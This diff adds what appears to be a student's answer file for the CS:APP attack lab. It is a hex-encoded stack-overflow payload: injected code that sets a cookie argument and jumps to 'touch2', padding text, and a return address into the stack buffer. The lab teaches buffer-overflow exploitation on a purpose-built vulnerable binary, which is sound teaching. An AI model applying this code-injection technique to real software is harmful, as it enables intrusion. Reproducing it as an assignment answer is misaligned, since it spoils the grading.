@@ -1,0 +1,13 @@
+/* Here is the inject code */
+bf fa 97 b9 59       	/* mov    $0x59b997fa,%edi  # the cookie */
+68 ec 17 40 00       	/* pushq  $0x4017ec  # the address of touch2 */ 
+c3                   	/* retq   */
+
+/* Here is the string to overflow the stack */
+49 20 77 61 6e 74 20 74 
+6f 20 72 75 6e 20 74 6f 
+75 63 68 32 21 21 21 21
+21 21 21 21 21
+
+/* Here is the address of the start of getbuf stack */
+78 dc 61 55 00 00 00 00
